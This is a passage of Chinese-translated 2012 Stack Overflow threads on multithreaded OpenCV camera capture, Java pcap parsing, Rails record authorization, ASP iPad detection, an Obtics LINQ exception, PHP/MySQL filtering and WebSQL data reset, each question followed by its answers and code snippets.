void grabFrame(concurrent_queue<IplImage* > * frame_queue, int camNumber) {
    try {
        //Load first frames
        cout << "grabFrame: " << camNumber << " init with " << cameraWidth << " x " << cameraHeight << endl;

        IplImage* frame;
        if (camNumber == 0)frame = cvQueryFrame(capture);
        if (camNumber == 1)frame = cvQueryFrame(capture2);
        while (frame && !threads_should_exit) {
            if (camNumber == 0)frame = cvQueryFrame(capture);
            if (camNumber == 1)frame = cvQueryFrame(capture2);
            IplImage* frame_copy = NULL;
            frame_copy = cvCloneImage(frame);

            if (camNumber == 0)cvShowImage("NE", frame);
            cout << "grabFrame: " << camNumber << " pushing back to queue" << endl;
            frame_queue->push(frame_copy);

            int k = cvWaitKey(waitKeyValue);

            if (k == 1048603 || k == 27 || k == '\r') {

                cout << "grabFrame: Process killed" << endl;
                //release memory
                threads_should_exit = true;
            }

        }
    } catch (const concurrent_queue<IplImage* >::Canceled & e) {
        cout << "grabFrame: Show thread is canceled" << endl;
        return;
    }

}

void processFrames(concurrent_queue<IplImage* > * frame_queue0, concurrent_queue<IplImage* > * frame_queue1) {
    try {
        do {
            cout << "processFrames: Processing two frames" << endl;
            IplImage* frm = NULL;
            frame_queue0->wait_and_pop(frm);
            IplImage * frm2 = NULL;
            frame_queue1->wait_and_pop(frm2);
            cvReleaseImage(&frm);
            cvReleaseImage(&frm2);
        } while (!threads_should_exit);
    } catch (const concurrent_queue<IplImage* >::Canceled & e) {
        cout << "processFrames: Processing thread is canceled" << endl;
        return;
    }
}

int main() {
    capture = cvCreateCameraCapture(0);
    capture2 = cvCreateCameraCapture(1);
    cvSetCaptureProperty(capture, CV_CAP_PROP_FRAME_WIDTH, cameraWidth);
    cvSetCaptureProperty(capture, CV_CAP_PROP_FRAME_HEIGHT, cameraHeight);
    cvSetCaptureProperty(capture2, CV_CAP_PROP_FRAME_WIDTH, cameraWidth);
    cvSetCaptureProperty(capture2, CV_CAP_PROP_FRAME_HEIGHT, cameraHeight);

    boost::thread_group frame_workers;
    boost::thread_group frame_workers2;
    concurrent_queue<IplImage* > frame_queue(&frame_workers);
    concurrent_queue<IplImage* > frame_queue2(&frame_workers2);

    boost::thread * query_thread = new boost::thread(processFrames, &frame_queue, &frame_queue2);
    boost::thread * cam0_thread = new boost::thread(grabFrame, &frame_queue, 0);
    usleep(10000);
    boost::thread * cam1_thread = new boost::thread(grabFrame, &frame_queue2, 1);

    frame_workers.add_thread(query_thread);
    frame_workers.add_thread(cam0_thread);

    frame_workers2.add_thread(query_thread);
    frame_workers2.add_thread(cam1_thread);
    while (true) {
        if (threads_should_exit) {
            cout << "Main: threads should be killed" << endl;
            while (!frame_queue.empty()) {
                usleep(10000);
            }
            frame_workers.remove_thread(query_thread);
            frame_workers2.remove_thread(query_thread);
            frame_workers.remove_thread(cam0_thread);
            frame_workers2.remove_thread(cam1_thread);

            frame_workers.join_all();
            break;
        }
        usleep(10000);
    }

    return 0;

} 
```

编辑：

我添加了一个简单的功能来检测一张纸，以查看我不打电话时是否一切正常`cvShowImage()`。如果我不调用，我的程序可以很好地检测到一张纸`cvShowImage()`。如果我这样做，程序再次出现奇怪的行为并冻结等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:42:47.363

应该只有一个线程在操作 GUI（这对于几乎任何 GUI 框架都是如此）。您应该组织您的代码，以便`cvShowImage`仅从主“GUI 线程”调用。

似乎正在完成的工作`query_thread`可以在主线程中轻松完成。

# java - Java pcap 解析器转换为 ByteBuffer

> ID：11396981
> 
> 赞同：0
> 
> 时间：2012-07-09T14:22:05.470
> 
> 标签：java, networking, tcp, udp, pcap

所以我使用 tcpdump 将我的 UDP 数据包捕获到一个文件中。我现在有我的 pcap 文件和我的数据包。现在我需要：

一个 Java 程序打开这个文件，解析它并将数据包内容，一次一个，放入一个 ByteBuffer 中，这样我的协议解析器就可以处理每个从网络获取的数据包。我的协议解析器必须不在乎它是被网络阅读器调用还是被 pcap 处理器调用。

Java中是否有库或标准方法可以做到这一点？你能给我或指出一些源代码示例吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:26:03.690

使用[jpcap](http://netresearch.ics.uci.edu/kfujii/Jpcap/doc/)，这正是你所需要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:34:21.503

要从文件中读取并将其放入 ByteBuffer 中，您可以使用

```
FileChannel in = new FileInputStream(filename).getChannel();

// read into a ByteBuffer from a file.
in.read(byteBuffer); 
```

# ruby-on-rails - 如何允许创作者使用 Devise on Rails3 销毁自己的记录

> ID：11396988
> 
> 赞同：0
> 
> 时间：2012-07-09T14:22:38.390
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise

当用户登录时，只有创建记录的用户才能销毁自己的记录。我应该在下面的代码中添加什么？

```
 def destroy

    @topic = Topic.find(params[:id])
    @topic.destroy
    flash[:notice] = "topic deleted!"

  end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:37:37.913

您正在寻找的不是真正的设计，而是像[CanCan](https://github.com/ryanb/cancan)这样的授权解决方案。

Devise 只能对用户进行身份验证并验证他们是否已登录并处于活动状态。您需要的是一种确定用户是否有权删除此主题的方法。

您当然可以像这样滚动自己：

```
 def destroy
    @topic = Topic.find(params[:id])
    if @topic.user_id == current_user.id
      @topic.destroy
      flash[:notice] = "topic deleted!"
    else
      flash[:error] = "not allowed"
    end
  end 
```

（代码假设您`belongs_to :creator, :class_name => :user`在主题中设置了关联。但您明白了）。

但是使用像[CanCan](https://github.com/ryanb/cancan)这样的东西会让你的生活变得更轻松，并且会将代码简化为如下所示：

```
 def destroy
    @topic = Topic.find(params[:id])
    authorize! :destroy, @topic
    @topic.destroy
    flash[:notice] = "topic deleted!"
  end 
```

使用您的能力文件（请参阅[定义能力](https://github.com/ryanb/cancan/wiki/defining-abilities)）设置如下：

```
can :manage, Topic, :owner_id => user.id 
```

# asp-classic - 在 ASP Classic/Legacy 中检测 iPad

> ID：11396989
> 
> 赞同：1
> 
> 时间：2012-07-09T14:22:41.617
> 
> 标签：asp-classic, browser-detection

在 ASP Classic/Legacy 中检测 iPad 的最佳方法是什么。

最好是返回 true 或 false 的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-13T13:40:23.690

```
Function is_iPad()
    Dim user_agent
    user_agent = Request.ServerVariables("HTTP_USER_AGENT")

    If InStr(1, user_agent, "ipad", 1) Then
        is_iPad = true
    Else
        is_iPad = false
    End If
End Function 
```

# wpf - 奇怪的 Obtics 异常

> ID：11396990
> 
> 赞同：0
> 
> 时间：2012-07-09T14:22:47.273
> 
> 标签：wpf, linq, mvvm, viewmodel, inotifypropertychanged

我正在使用 Obtics 库进行实时 linq 查询。

但是我无法通过这个完全没有意义的奇怪异常。

这是我的查询：

```
var query = ExpressionObserver.Execute(() =>
        from o in _orders.DefaultIfEmpty(new OrderStatusViewModel())
        where o.State != OrderStateEnum.Canceled
        group o by o.Isin
            into g
            let name = _referenceData.GetInstrumentName(g.Key)
            orderby name ascending
            select new ComplexRowViewModel(_referenceData)
            {
                UnderlyingOrder = g.First(),
                PrimaryExchange = (from q in _quotes.DefaultIfEmpty(new QuoteTickViewModel()).Where(w => w.Exchange == _referenceData.GetPrimaryExchangeId(g.Key) && w.Isin == g.Key && w.Provider == ProviderEnum.Bloomberg)
                                   select new SimpleRowViewModel()
                                   {
                                       UnderlyingQuote = q
                                   }).First(),
                Groupped = (from y in _orders.DefaultIfEmpty(new OrderStatusViewModel())
                            join x in _quotes.DefaultIfEmpty(new QuoteTickViewModel()) on new { y.Isin, y.Exchange }
                                equals new { x.Isin, x.Exchange }
                            where
                                y.Isin == g.Key &&
                                y.State != OrderStateEnum.Canceled &&
                                x.Provider == ProviderEnum.Tradebase &&
                                x.Exchange !=
                                _referenceData.GetPrimaryExchangeId(g.Key)
                            group x by new { x.Exchange }
                                into p
                                select new SimpleRowViewModel()
                                {
                                    UnderlyingQuote = p.First()
                                }
                           ),
                Uncompressed = (from o in _orders.DefaultIfEmpty(new OrderStatusViewModel())
                                where o.State != OrderStateEnum.Canceled && o.Isin == g.Key
                                select new UncompressedRowViewModel() { UnderlyingOrder = o }),

                Compressed = (from o in _orders.DefaultIfEmpty(new OrderStatusViewModel())
                              where o.State != OrderStateEnum.Canceled && o.Isin == g.Key
                              group o by new { o.LimitPrice, o.OrderSide } into x
                              select new CompressedRowViewModel()
                              {
                                  Ask = x.Key.OrderSide == OrderSideEnum.Sell ? (decimal?)x.Key.LimitPrice : (decimal?)null,
                                  AskSize = x.Key.OrderSide == OrderSideEnum.Sell ? x.Select(s => s.Quantity).Aggregate((c, n) => c + n) : 0,
                                  Bid = x.Key.OrderSide == OrderSideEnum.Buy ? (decimal?)x.Key.LimitPrice : (decimal?)null,
                                  BidSize = x.Key.OrderSide == OrderSideEnum.Buy ? x.Select(s => s.Quantity).Aggregate((c, n) => c + n) : 0,
                                  Exchange = string.Join(", ", x.Select(s => s.Exchange)),
                                  Isin = x.First().Isin.ToString(),
                                  OrderBuyCount = x.Key.OrderSide == OrderSideEnum.Buy ? x.Count() : 0,
                                  OrderSellCount = x.Key.OrderSide == OrderSideEnum.Sell ? x.Count() : 0,
                                  RowSide = x.Key.OrderSide == OrderSideEnum.Sell ? RowSide.Sell : RowSide.Buy
                              })}
    ).Cascade();

GridData = query; 
```

我上传了使这一切成为可能的课程。[http://www.4shared.com/file/ce_V8PPh/MarketData.html](http://www.4shared.com/file/ce_V8PPh/MarketData.html)

例外是：

```
InvalidOperationException, Added item does not appear at given index '0'. 
```

但这没有任何意义，因为该项目已经存在。

一切正常，直到 OrderStatus 进入“已取消”状态。我认为这是因为我在查询之上过滤了取消的订单，但我不知道这有什么关系。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:25:57.543

我终于找到了解决我的问题的方法。事实证明，Obtics 在使用 lambda 创建动态类时存在问题，例如

```
from o in orders where o.state == "active" select new OrderModel2 {Underlying = o} 
```

新关键字搞砸了。您需要手动处理此类创建。

无论如何，经过 2 天的头部粉碎后，我最终得到了这么多代码。

```
private void CreateQueries()
{
    var query = ExpressionObserver.Execute(() => (from o in _orders
                                                  where o.State != OrderStateEnum.Canceled
                                                  group o by o.Isin
                                                      into g
                                                      let name = _referenceData.GetInstrumentName(g.Key)
                                                      orderby name ascending
                                                      select GetComplexRowViewModel(
                                                                                    g.First()
                                                                                    ,
                                                                                    (from p in _quotes
                                                                                     where
                                                                                         p.Isin == g.Key &&
                                                                                         p.Exchange == _referenceData.GetPrimaryExchangeId(g.Key) &&
                                                                                         p.Provider == ProviderEnum.Bloomberg
                                                                                     select GetSimpleRowViewModel(p))
                                                                                     ,
                                                                                     (from q in _quotes
                                                                                      where
                                                                                          q.Isin == g.Key &&
                                                                                          q.Provider == ProviderEnum.Tradebase &&
                                                                                          g.Select(s => s.Exchange).Contains(q.Exchange)
                                                                                      select GetSimpleRowViewModel(q))
                                                                                      ,
                                                                                      (from o in _orders
                                                                                       where o.Isin == g.Key
                                                                                       && o.State != OrderStateEnum.Canceled
                                                                                       group o by new { o.LimitPrice, o.OrderSide } into x
                                                                                       select GetCompressedRowViewModel
                                                                                       (
                                                                                           x.Key.OrderSide == OrderSideEnum.Sell ? (decimal?)x.Key.LimitPrice : (decimal?)null,
                                                                                           x.Key.OrderSide == OrderSideEnum.Sell ? x.Select(s => s.Quantity).Aggregate((c, n) => c + n) : 0,
                                                                                           x.Key.OrderSide == OrderSideEnum.Buy ? (decimal?)x.Key.LimitPrice : (decimal?)null,
                                                                                           x.Key.OrderSide == OrderSideEnum.Buy ? x.Select(s => s.Quantity).Aggregate((c, n) => c + n) : 0,
                                                                                           string.Join(", ", x.Select(s => s.Exchange)),
                                                                                           x.First().Isin.ToString(),
                                                                                           x.Key.OrderSide == OrderSideEnum.Buy ? x.Count() : 0,
                                                                                           x.Key.OrderSide == OrderSideEnum.Sell ? x.Count() : 0,
                                                                                           x.Key.OrderSide == OrderSideEnum.Sell ? RowSide.Sell : RowSide.Buy
                                                                                       ))
                                                           ,
                                                           (from o in _orders
                                                            where o.Isin == g.Key
                                                            && o.State != OrderStateEnum.Canceled
                                                            select GetUncompressedRowViewModel(o))

                                                                                     ))).Cascade();
    GridData = query;
}

// Obtics 
private ConcurrentDictionary<string, ComplexRowViewModel> _complexRowViewModels = new ConcurrentDictionary<string, ComplexRowViewModel>();
private ComplexRowViewModel GetComplexRowViewModel(OrderStatusViewModel model, IEnumerable<SimpleRowViewModel> primaryExchanges, IEnumerable<SimpleRowViewModel> groupped
    , IEnumerable<CompressedRowViewModel> compressed, IEnumerable<UncompressedRowViewModel> uncompressed)
{
    if (model == null)
        return _complexRowViewModels.GetOrAdd("", s2 => new ComplexRowViewModel());

    return _complexRowViewModels.GetOrAdd(model.Isin,
                                          s2 =>
                                          new ComplexRowViewModel(_referenceData) { UnderlyingOrder = model, PrimaryExchange = primaryExchanges.DefaultIfEmpty(new SimpleRowViewModel()).First(), Groupped = groupped, Compressed = compressed, Uncompressed = uncompressed });
}

private ConcurrentDictionary<string, SimpleRowViewModel> _simpleRowViewModels = new ConcurrentDictionary<string, SimpleRowViewModel>();
private SimpleRowViewModel GetSimpleRowViewModel(QuoteTickViewModel model)
{
    if (model == null)
        return _simpleRowViewModels.GetOrAdd("", s2 => new SimpleRowViewModel());

    return _simpleRowViewModels.GetOrAdd(model.Isin + model.Exchange,
                                                        s2 =>
                                                        new SimpleRowViewModel() { UnderlyingQuote = model });
}

private ConcurrentDictionary<string, UncompressedRowViewModel> _uncompressedRowViewModels = new ConcurrentDictionary<string, UncompressedRowViewModel>();
private UncompressedRowViewModel GetUncompressedRowViewModel(OrderStatusViewModel model)
{
    if (model == null)
        return _uncompressedRowViewModels.GetOrAdd("", s2 => new UncompressedRowViewModel());

    return _uncompressedRowViewModels.GetOrAdd(model.InternalId,
                                                        s2 =>
                                                        new UncompressedRowViewModel() { UnderlyingOrder = model });
}

private ConcurrentDictionary<string, CompressedRowViewModel> _compressedRowViewModels = new ConcurrentDictionary<string, CompressedRowViewModel>();
private CompressedRowViewModel GetCompressedRowViewModel(decimal? Ask, int AskSize, decimal? Bid, int BidSize, string Exchange, string Isin, int OrderBuyCount, int OrderSellCount, RowSide RowSide)
{

    return new CompressedRowViewModel()
               {
                   Ask = Ask,
                   AskSize = AskSize,
                   Bid = Bid,
                   BidSize = BidSize,
                   Exchange = Exchange,
                   Isin = Isin,
                   OrderBuyCount = OrderBuyCount,
                   OrderSellCount = OrderSellCount,
                   RowSide = RowSide
               };
} 
```

它有效，但看起来很丑，如果有人有办法让它更漂亮，我将不胜感激。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T09:47:17.107

问题不在于“new”关键字，而是 OrderModel2 类型的两个实例不相等，即使它们是使用相等的构造参数创建的。

这可以通过三种方式解决：

1.  覆盖对象的 Equals 方法。
2.  使用特定的相等比较器将 ObticsEqualityComparerAttribute 应用于您的类以供 Obtics 使用。
3.  创建具有存储库的工厂，该存储库在使用相同的构造参数调用时返回相同的对象实例。

您似乎使用了数字 3，但我认为您的代码可能更简单和通用。

# php - 如何使用选择菜单在 HTML 表中显示来自 SQL 数据库的特定结果

> ID：11396996
> 
> 赞同：0
> 
> 时间：2012-07-09T14:23:03.457
> 
> 标签：php, html, sql

我已经在这几个小时了，我已经取得了一点突破，但是我现在处于静止状态。我有一个存储车辆信息的 SQL 数据库，例如品牌、型号和年份。我想要做的是允许用户修改查询并且只显示特定的结果。

我了解如何一次显示所有记录，但我想添加的是当用户选择例如“丰田”的品牌时，我只希望出现特定的品牌。通过使用以下代码，我确实达到了某些地方：

```
<form method="post" action=""> 
 <div id="search_query" >
     Make 
    <select name="make" size="0">
    <option value="honda">Honda</option>
  <option value="toyota">Toyota</option>
  <option value="nissan">Nissan</option>
    </select>

     <input type="submit" name="submit" value="submit">

 </div>
 </form>     

<?php

    $db_con = mysql_connect('localhost', 'root', '');

    if (!$db_con) {
        die('Could not connect: ' . mysql_error());
    }

    mysql_select_db('my_db', $db_con);

    $make = mysql_real_escape_string($_POST['make']);

    $sql = sprintf("SELECT * FROM chjadb_vehicles WHERE v_make= '$make' ");

    $result = mysql_query($sql);

    echo "<table width= 970 border=1>
         <tr>
           <th width='120' scope='col'>Image</th>
           <th width='170' scope='col'>Details</th>
           <th width='185' scope='col'>Seller</th>
           <th width='126' scope='col'>Price</th>
         </tr>";
    while($row = mysql_fetch_array($result))
      { 
         echo "<tr>";
           echo "<td> <img src=" .$row['v_image']. " width =200 height = 130>" . "</td>";
           echo "<td>". $row['v_year'] . "&nbsp;" . $row['v_make'] . "&nbsp;". $row['v_model'] . "&nbsp;". $row['b_type']. "</td>";
           echo "<td>". $row['user_id'] ."</td>";
           echo "<td>". $row['v_price'] ."</td>";
         echo "</tr>";
      }
       echo "</table>";

     mysql_close($db_con);
    ?> 
```

但是，当我最初运行该页面时，我收到此错误：“注意：未定义的索引：在第 62 行的 C:\xampp\htdocs\carhuntja.com\buy_a_car.php 中制作”

我做了一些研究并意识到发生这种情况是因为我没有设置制造值，我希望在这里做的是在开始访问该页面时，我希望显示所有车辆。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:30:23.900

问题是查询是在用户选择品牌之前发送的。要解决此问题，您需要通过将您的 PHP 代码封装在其中来检查用户是否实际提交了表单`if(isset($_POST['submit']))`（使用“提交”，因为这是`name`您的提交按钮）。

```
//place connection code here (do not query the database yet)

if(isset($_POST['submit']))
{
   //all of the database retrieval code
}
else
{
  $query_makes = "SELECT v_make FROM chjadb_vehicles";
  $result_makes = mysqli_query($query_makes);
  echo "Please choose a make."
  //echo opening select tag
  while($row = mysql_fetch_array($result_makes))
  {
     //echo each option tag
  }
  //echo ending select tag
} 
```

此外，您在自包含输入标签中缺少斜杠。最后，您应该使用[MySQLi 函数](http://php.net/manual/en/book.mysqli.php)，因为 PHP 中不推荐使用 MySQL 函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:32:49.750

1.  当页面首次加载时，您需要运行此查询：

    ```
    SELECT * FROM chjadb_vehicles 
    ```

2.  您需要检查用户是否单击了提交按钮并发布了 make 字段，为此使用 isset()：

    ```
    if (isset($_POST['make']){
        $make = mysql_real_escape_string($_POST['make']);
    } 
    ```

3.  我强烈建议你使用[jquery](http://jquery.com/)和[ajax](http://api.jquery.com/jQuery.ajax/)

**编辑：**

第一次加载页面时，您会显示所有车辆。

在您的 javascript 中，您将一个 onSelect 事件绑定到下拉列表，一旦用户选择了一个品牌，您就会向服务器发送一个 ajax 请求并显示来自服务器的新结果，所以它看起来像这样：

```
$('#search_query select').change(function(){
//get the selected option text
var selectedVal = $(this).find('option:selected').text();

//send ajax request
$.ajax( {
url : url,
type : "POST",
data : selectedVal ,
dataType : 'json',
success : function(data) {//handle returned data}
}) 
```

});

我建议你看看[这里](http://net.tutsplus.com/articles/web-roundups/jquery-for-absolute-beginners-video-series/)，关于 jquery 的完整视频教程。

# javascript - websql phonegap app：数据库升级

> ID：11396997
> 
> 赞同：0
> 
> 时间：2012-07-09T14:23:08.267
> 
> 标签：javascript, android, cordova, web-sql

我正在谷歌市场商店升级我的 android/phonegap 应用程序。

由于我的疏忽，我需要重新开始，并且需要删除存储在 websql 中的现有用户数据并重新开始以正确的格式捕获它。

执行此操作的最佳方法是确保在用户手机上首次升级应用程序时删除数据，而不是每次启动应用程序时都删除数据？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:37:11.263

只需编写 SQL 代码，如果该表存在，它将删除存储用户信息的表。然后将您的用户信息存储在一个新的、不同的名称表中。例如：

```
tx.executeSql('DROP TABLE IF EXISTS DEMO');
tx.executeSql('CREATE TABLE IF NOT EXISTS NEW_DEMO (id unique, data)'); 
```